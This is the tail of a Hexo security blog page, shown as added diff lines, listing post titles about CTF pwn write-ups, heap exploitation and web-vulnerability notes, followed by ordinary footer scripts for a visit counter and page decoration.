+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2024/12/27/House%20of%20apple2%20%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">House of apple2 学习笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/2024/07/10/%E7%AC%AC%E4%BA%8C%E7%AB%A0%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90-mysql-%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA/">第二章日志分析-mysql-应急响应-玄机靶场</a></li><li class="post-list-item"><a class="post-list-link" href="/2024/07/10/%E7%AC%AC%E4%B8%89%E7%AB%A0-%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81-linux%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81-%E9%9A%90%E8%97%8F/">第三章 权限维持-linux权限维持-隐藏-玄机靶场</a></li><li class="post-list-item"><a class="post-list-link" href="/2024/07/10/%E7%AC%AC%E4%BA%8C%E7%AB%A0%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90-redis%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA/">第二章日志分析-redis应急响应-玄机靶场</a></li><li class="post-list-item"><a class="post-list-link" href="/2024/07/10/%E7%AC%AC%E4%B8%80%E7%AB%A0-%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-Linux%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5-%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA/">第一章-应急响应-Linux入侵排查-玄机靶场</a></li><li class="post-list-item"><a class="post-list-link" href="/2024/07/10/%E7%AC%AC%E4%B8%80%E7%AB%A0-%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-webshell%E6%9F%A5%E6%9D%80-%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA/">第一章-应急响应-webshell查杀-玄机靶场</a></li><li class="post-list-item"><a class="post-list-link" href="/2024/07/10/%E7%AC%AC%E4%B8%80%E7%AB%A0/">第一章-应急响应-Linux 日志分析-玄机靶场</a></li><li class="post-list-item"><a class="post-list-link" href="/2024/07/10/%E7%AC%AC%E4%BA%8C%E7%AB%A0-/">第二章-日志分析-apache日志分析-玄机靶场</a></li><li class="post-list-item"><a class="post-list-link" href="/2024/02/15/%E4%BB%8EHTB%20_Arms_roped%E5%88%9D%E8%AF%86arm%E6%9E%B6%E6%9E%84/">从HTB _Arms_roped初识arm架构和qemu</a></li><li class="post-list-item"><a class="post-list-link" href="/2023/10/07/Python2%20%E7%8E%AF%E5%A2%83%E5%9C%A8ubuntu22.04%20%E9%85%8D%E7%BD%AE/">在ubuntu22.04配置Python2环境</a></li><li class="post-list-item"><a class="post-list-link" href="/2023/09/22/msql%E6%95%B0%E6%8D%AE%E5%BA%93-udf-%E6%8F%90%E6%9D%83%E5%A7%BF%E5%8A%BF%E5%AD%A6%E4%B9%A0/">msql数据库-udf-提权姿势学习</a></li><li class="post-list-item"><a class="post-list-link" href="/2023/04/20/python-sandbox%20bypass%20'()'%20to%20%20runing%20function/">Python-sandbox bypass '(' and ')' to  calling function</a></li><li class="post-list-item"><a class="post-list-link" href="/2023/01/29/ELF%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90--Program%20header/">ELF文件解析--Program header</a></li><li class="post-list-item"><a class="post-list-link" href="/2023/01/07/ELF%E6%96%87%E4%BB%B6%E5%A4%B4%E8%A7%A3%E6%9E%90%E5%AD%A6%E4%B9%A0/">ELF文件解析--ELF header 分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/10/16/decrypt_safe_linking/">how2heap-decrypt_safe_linking学习</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/10/02/2022%E5%B7%9D%E6%B8%9D%E8%81%8C%E4%B8%9A%E6%8A%80%E8%83%BD%E7%AB%9E%E8%B5%9B%E5%88%9D%E8%B5%9B--hard_login/">2022川渝职业技能竞赛初赛--hard_login</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/09/14/%E5%B7%9D%E6%B8%9D%E4%B8%AA%E4%BA%BA%E8%B5%9B-wp/">2022川渝个人赛-wp</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/07/26/%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E%E8%AF%AD%E6%B3%95%E5%AD%A6%E4%B9%A0/">搜索引擎语法学习</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/06/17/how2heap-fastbin_reverse_into_tcache-%E5%AD%A6%E4%B9%A0/">how2heap-fastbin_reverse_into_tcache-学习</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/06/15/how2heap-house_of_botcake-%E5%AD%A6%E4%B9%A0/">how2heap-house_of_botcake-学习</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/05/16/%E5%9C%A8unity%E4%B8%AD%E4%BD%BF%E7%94%A8DragonBones%E9%AA%A8%E9%AA%BC/">在unity中使用DragonBones骨骼的方法</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/04/07/RITSEC-CTF-2022%20-PWN-hangpwn/">RITSEC-CTF-2022-PWN-hangpwn</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/04/03/HTB-Login%20Simulator-pwn-challenge-wp/">HTB-Login Simulator-pwn-challenge-wp</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/03/26/HTB-baby_ninja_jinja-web-challenge-wp/">HTB-baby_ninja_jinja-web-challenge-wp</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/03/26/HTB-Neonify-web-challenge-wp/">HTB-Neonify-web-challenge-wp</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/03/08/HTB-Pandora-wp/">HTB-Pandora-Machine-wp</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/02/22/HSC2021-CTF/">HSC2021-CTF-pwn</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/12/31/sctf2021-pwn-dataleak/">sctf2021-pwn-dataleak-wp</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/12/04/%E4%B8%9C%E8%BD%AF/">东软2021CTF--PWN--wp</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/12/03/cosy-casino-pwn-challenge-wp/">HTB-cosy_casino-pwn-challenge-wp</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/11/27/2021%E5%B9%B4%E6%98%A5%E7%A7%8B%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%81%94%E8%B5%9B%E7%A7%8B%E5%AD%A3%E8%B5%9B%E5%8B%87%E8%80%85%E5%B1%B1%E5%B3%B0/">2021年春秋杯网络安全联赛秋季赛勇者山峰-WP</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/11/07/Largebin%20Attack%20for%20Glibc%202.31%20%E5%AD%A6%E4%B9%A0/">Large bin Attack for Glibc 2.31 学习</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/11/03/%E8%A7%A3%E5%86%B3yelee%E6%A8%A1%E6%9D%BF%E4%B8%8Blive2d%E7%9C%8B%E6%9D%BF%E5%A8%98%E5%92%8Cbusuanzi%E4%B8%8D%E8%92%9C%E5%AD%90%E8%AE%A1%E6%95%B0%E5%86%B2%E7%AA%81/">解决yelee模板下live2d看板娘和busuanzi不蒜子计数冲突</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/11/02/PWN%20Hunting%20challenge%20%E2%80%94%20HTB/">Hunting— HTB  PWN  challenge</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/10/20/xman%E7%9A%84leve5%E5%8F%A6%E4%B8%80%E7%A7%8D%E8%A7%A3%E6%B3%95(mprotect)%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%88%A9%E7%94%A8/">xman的leve5另一种解法(mprotect)学习与利用</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/09/21/ctfshow-%E6%9C%88%E9%A5%BC%E6%9D%AF-pwn-wp/">ctfshow-月饼杯2021-pwn-wp</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/09/16/'could%20not%20patch%20the%20PLT%20stub;%20unexpected%20PLT%20format%20or%20the%20file%20has%20been%20modified%20after%20linking!'%E6%8A%A5%E9%94%99%E7%BC%93%E8%A7%A3%E6%96%B9%E6%B3%95/">\`could not patch the PLT stub; unexpected PLT format or the file has been modified after linking!\`报错缓解方法</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/09/03/5%E7%A7%8D%E5%AD%97%E7%AC%A6%E6%9E%84%E9%80%A0php_shellcode/">5种字符'(^.9)'构造php_shellcode</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/08/17/ractf2021-pwn-ctf/">ractf2021-pwn-ctf</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/07/28/imaginaryctf2021--pwn-wp/">imaginaryctf2021-pwn-wp</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/07/12/%E9%AB%98%E7%89%88%E6%9C%AClibc(2.29-2.32)%20off%20by%20null%E5%88%A9%E7%94%A8%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93/">高版本libc(2.29-2.32) off by null利用姿势笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/06/26/2021qwb%20pwn%20wp/">2021qwb-pwn-初赛-wp</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/05/28/ISCC2021%20PWN%20WP/">ISCC2021 PWN部分 WP</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/05/22/ret2dl-resolve%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95%E5%B0%8F%E8%AE%B0/">ret2dl-resolve利用方法小记</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/05/20/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E4%B8%8ESROP%E6%96%B9%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">系统调用与SROP方法学习笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/05/02/heap%E6%B3%84%E9%9C%B2%E7%9C%9F%E5%AE%9E%E5%9C%B0%E5%9D%80tirck/">pwn堆题泄露libc真实地址小tirck</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/04/28/CTF%202021%20PWN%20babyheap%20%20%E5%A4%8D%E7%8E%B0%E8%AE%B0/">2021*CTF_PWN_babyheap复现记</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/04/25/%E5%85%B3%E4%BA%8E%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%88%A9%E7%94%A8%E2%80%94%E2%80%94%E5%AD%A6pwn%E5%B0%8F%E8%AE%B0(9)/">关于格式化字符串利用——学pwn小记(9)</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/04/17/Tcache%20attack%E5%AD%A6%E4%B9%A0%E2%80%94%E2%80%94%E5%AD%A6pwn%E5%B0%8F%E8%AE%B0(8)/">Tcache attack初学习——学pwn小记(8)</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/04/09/%E4%BB%8E%E5%AF%B9b00k%E9%A2%98%E7%9B%AEwp%E5%AD%A6%E4%B9%A0%E5%88%9D%E4%B9%A0off-by-one%E2%80%94%E2%80%94%E5%AD%A6pwn%E5%B0%8F%E8%AE%B0(7)/">从对b00k题目学习中初习off-by-one——学pwn小记(7)</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/04/08/actf--wp/">ångstromCTF 2021--wp与复现记</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/03/25/%E4%BF%AE%E6%94%B9ELF%E6%96%87%E4%BB%B6libc%E4%B8%BA%E6%8C%87%E5%AE%9A%E7%89%88%E6%9C%AC/">修改ELF文件libc为指定版本</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/03/14/%E5%8A%AB%E6%8C%81hook%E5%87%BD%E6%95%B0%E2%80%94%E2%80%94%E5%AD%A6pwn%E5%B0%8F%E8%AE%B0(6)/">劫持hook函数——学pwn小记(6)</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/03/11/fastbin%E4%BA%8C%E6%AC%A1%E9%87%8A%E6%94%BE%E2%80%94%E2%80%94%E5%AD%A6pwn%E5%B0%8F%E8%AE%B0(5)/">fastbin二次释放——学pwn小记(5)</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/02/15/%E7%BD%91%E9%BC%8E%E6%9D%AF%202018-Comment%20%20%E5%A4%8D%E7%8E%B0%E7%AC%94%E8%AE%B0/">网鼎杯 2018-Comment  复现笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/01/31/%E5%85%B3%E4%BA%8Esql%E6%B3%A8%E5%85%A5bypass%E6%80%BB%E7%BB%93/">关于sql注入bypass总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/01/08/%E5%AE%89%E6%B4%B5%E6%9D%AF2019%E5%A4%8D%E7%8E%B0/">安洵杯2019复现</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/01/07/xman%20pwn%E9%A2%98%E5%A4%8D%E7%8E%B0/">xman pwn题复现——学pwn小记（4）</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/12/31/flask.request%E7%9A%84%E5%86%85%E7%BD%AE%E5%B1%9E%E6%80%A7%E6%80%BB%E7%BB%93/">flask.request的内置属性总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/12/30/%E5%AF%B9php%E4%BC%AA%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%BD%92%E7%BA%B3/">对php伪协议的归纳</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/12/21/HWCTF-%E5%8D%8E%E4%B8%BA%E4%BA%91%E5%9C%BAWP/">HWCTF-华为云场WP</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/12/16/linux%20%E5%86%85%E7%BD%AE%E5%8F%82%E6%95%B0%E6%95%B4%E7%90%86/">linux 内置参数整理</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/11/27/%E5%85%B3%E4%BA%8Ejinja%E7%89%B9%E6%80%A7%E5%AF%B9ssti%E7%9A%84bypass%E7%9A%84%E5%BD%B1%E5%93%8D/">关于jinja2特性对ssti的bypass的影响</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/11/16/%E5%85%B3%E4%BA%8Ephp%E6%89%A7%E8%A1%8C%E4%B8%8E%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E5%A4%84%E7%90%86%E5%87%BD%E6%95%B0%E6%95%B4%E7%90%86/">php执行与文件系统处理函数整理</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/11/15/%E7%AC%AC%E4%BA%94%E5%B1%8A%E4%B8%8A%E6%B5%B7%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B-wp/">第五届上海市大学生网络安全大赛-初赛wp</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/11/12/ctf-show_%E5%8E%9F%E8%B0%85%E6%9D%AFwp/">ctf-show_原谅杯wp</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/10/26/ctf-show%201024%E6%9D%AF/">ctf-show 1024杯</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/10/15/%E5%AD%A6%E4%B9%A0pwn%E5%B0%8F%E8%AE%B0(3)/">Linux_x64下的ret2bilc与ret2csu--学习pwn小记(3)</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/10/14/%E7%AC%AC%E5%8D%81%E4%B8%89%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B-%E5%88%9B%E6%96%B0%E5%AE%9E%E8%B7%B5%E8%83%BD%E5%8A%9B%E8%B5%9B%E8%A5%BF%E5%8D%97%E8%B5%9B%E5%8C%BA%E9%80%89%E6%8B%94%E8%B5%9Bwp/%E7%AC%AC%E5%8D%81%E4%B8%89%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B-%E5%88%9B%E6%96%B0%E5%AE%9E%E8%B7%B5%E8%83%BD%E5%8A%9B%E8%B5%9B%E8%A5%BF%E5%8D%97%E8%B5%9B%E5%8C%BA%E9%80%89%E6%8B%94%E8%B5%9Bwp/">第十三届全国大学生信息安全竞赛-创新实践能力赛西南赛区选拔赛wp/第十三届全国大学生信息安全竞赛-创新实践能力赛西南赛区选拔赛wp</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/09/22/%E7%AC%AC%E5%8D%81%E4%B8%89%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B-%E5%88%9B%E6%96%B0%E5%AE%9E%E8%B7%B5%E8%83%BD%E5%8A%9B%E8%B5%9B%E8%A5%BF%E5%8D%97%E8%B5%9B%E5%8C%BA%E9%80%89%E6%8B%94%E8%B5%9Bwp/">第十三届全国大学生信息安全竞赛-创新实践能力赛西南赛区选拔赛wp</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/09/13/%E5%AD%A6%E4%B9%A0pwn%E5%B0%8F%E8%AE%B0(2)/">学习pwn小记(2)</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/09/10/%E5%AF%B9linux%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E6%80%BB%E7%BB%93/">对linux 命令执行的总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/09/09/%E5%AD%A6%E4%B9%A0pwn%E5%B0%8F%E8%AE%B0(1)/">学习pwn小记(1)</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/08/12/SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/">关于SQL注入小记</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/07/26/%E5%AE%89%E6%81%92DASCTF%207%E6%9C%88%E8%B5%9BWP/">安恒DASCTF 7月赛WP</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/07/15/rgbCTF--wp/">sctf2020 pythonbox题目复现小记</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/06/18/NahamCon%20CTF%20WP/">NahamCon CTF WP</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/05/31/%E5%AF%B9%E4%BA%8E%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E7%9A%84%E7%9F%A5%E8%AF%86%E6%A2%B3%E7%90%86/">对于文件包含漏洞的知识梳理</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/04/26/%E5%85%B3%E4%BA%8Ephp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E9%80%83%E9%80%B8%E7%9A%84%E6%80%9D%E8%80%83/">关于php反序列化字符逃逸的思考</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/04/23/%E5%A6%82%E4%BD%95%E8%AE%A9%E6%96%87%E4%BB%B6%E9%87%8CPHP%E4%BB%A3%E7%A0%81%E8%A2%AB%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%A7%A3%E6%9E%90%E6%89%A7%E8%A1%8C/">如何让文件里PHP代码被服务器解析执行</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/04/21/%E8%99%8E%E7%AC%A6CTF2020--EasyLogin%20%20%20Write%20%20up/">虎符CTF2020--EasyLogin WP</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/03/27/python%20%E5%85%B3%E4%BA%8E%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8%E7%9A%84%E6%80%9D%E8%80%83/">关于python ssti的思考</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/11/13/%E5%85%B3%E4%BA%8Eupdatexml()%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E7%9A%84%E6%80%9D%E8%80%83/">关于updatexml()报错注入的思考</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/10/cocos2d%E5%AE%98%E6%96%B9%E6%96%87%E6%A1%A3%E6%B1%89%E5%8C%96--Writing%20a%20cocos2d%20application/">cocos2d官方文档汉化--Writing a cocos2d application</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/01/03/hello-world/">Hello World</a></li></ul>
+
+
+
+
+    <script>
+        
+    </script>
+
+
+</div>
+
+
+
+
+  
+      <footer id="footer">
+    <div class="outer">
+        <div id="footer-info">
+        	                <span id="timeDate">载入天数...</span><span id="times">载入时分秒...</span>
+<script>
+    var now = new Date(); 
+    function createtime() { 
+        var grt= new Date("01/03/2019 12:39:00");//此处修改你的建站时间或者网站上线时间 
+        now.setTime(now.getTime()+250); 
+        days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days); 
+        hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours); 
+        if(String(hnum).length ==1 ){hnum = "0" + hnum;} minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum); 
+        mnum = Math.floor(minutes); if(String(mnum).length ==1 ){mnum = "0" + mnum;} 
+        seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum); 
+        snum = Math.round(seconds); if(String(snum).length ==1 ){snum = "0" + snum;} 
+        document.getElementById("timeDate").innerHTML = "本站已安全运行 "+dnum+" 天 "; 
+        document.getElementById("times").innerHTML = hnum + " 小时 " + mnum + " 分 " + snum + " 秒"; 
+    } 
+setInterval("createtime()",250);
+</script>
+            <div class="footer-left">
+                <i class="fa fa-copyright"></i> 
+                2019-2024 lexsd6
+            </div>
+            <div class="footer-right">
+                <a href="http://hexo.io/" target="_blank" title="快速、简洁且高效的博客框架">Hexo</a>  Theme <a href="https://github.com/MOxFIVE/hexo-theme-yelee" target="_blank" title="简而不减 Hexo 双栏博客主题  v3.5">Yelee</a> by MOxFIVE <i class="fa fa-heart animated infinite pulse"></i>
+            </div>
+        </div>
+
+    <div class="visit">
+        
+            <span id="busuanzi_container_site_pv" style='display:inline'>
+                <span id="site-visit" title="本站到访数"><i class="fa fa-user" aria-hidden="true"></i><span id="busuanzi_value_site_uv"></span>
+                </span>
+            </span>
+        
+        
+            <span>| </span>
+        
+        
+            <span id="busuanzi_container_page_pv" style='display:inline'>
+                <span id="page-visit"  title="本页阅读量"><i class="fa fa-eye animated infinite pulse" aria-hidden="true"></i><span id="busuanzi_value_page_pv"></span>
+                </span>
+            </span>
+        
+    </div>
+
+    </div>
+</footer>
+    </div>
+    
+<script data-main="/js/main.js" src="//cdn.bootcss.com/require.js/2.2.0/require.min.js"></script>
+
+    <script>
+        $(document).ready(function() {
+            var iPad = window.navigator.userAgent.indexOf('iPad');
+            if (iPad > -1 || $(".left-col").css("display") === "none") {
+                var bgColorList = ["#9db3f4", "#414141", "#e5a859", "#f5dfc6", "#c084a0", "#847e72", "#cd8390", "#996731"];
+                var bgColor = Math.ceil(Math.random() * (bgColorList.length - 1));
+                $("body").css({"background-color": bgColorList[bgColor], "background-size": "cover"});
+            }
+            else {
+                var backgroundnum = 20;
+                var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
+                $("body").css({"background": backgroundimg, "background-attachment": "fixed", "background-size": "cover"});
+            }
+        })
+    </script>
+
+
+
+
+
+<div class="scroll" id="scroll">
+    <a href="#" title="返回顶部"><i class="fa fa-arrow-up"></i></a>
+    <a href="#comments" onclick="load$hide();" title="查看评论"><i class="fa fa-comments-o"></i></a>
+    <a href="#footer" title="转到底部"><i class="fa fa-arrow-down"></i></a>
+</div>
+<script>
+    // Open in New Window
+    
+        var oOpenInNew = {
+            
+            
+            
+            
+            
+            
+             archives: ".archive-article-title", 
+             miniArchives: "a.post-list-link", 
+            
+             friends: "#js-friends a", 
+             socail: ".social a" 
+        }
+        for (var x in oOpenInNew) {
+            $(oOpenInNew[x]).attr("target", "_blank");
+        }
+    
+</script>
+
+    <script>
+        var originTitle = document.title;
+        var titleTime;
+        document.addEventListener("visibilitychange", function() {
+            if (document.hidden) {
+                document.title = "(つェ⊂) 我藏好了哦~ " + originTitle;
+                clearTimeout(titleTime);
+            }
+            else {
+                document.title = "(*´∇｀*) 被你发现啦~ " + originTitle;
+                titleTime = setTimeout(function() {
+                    document.title = originTitle;
+                }, 2000);
+            }
+        })
+    </script>
+
+<script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+  </div>
+
+
+</body>
+</html>
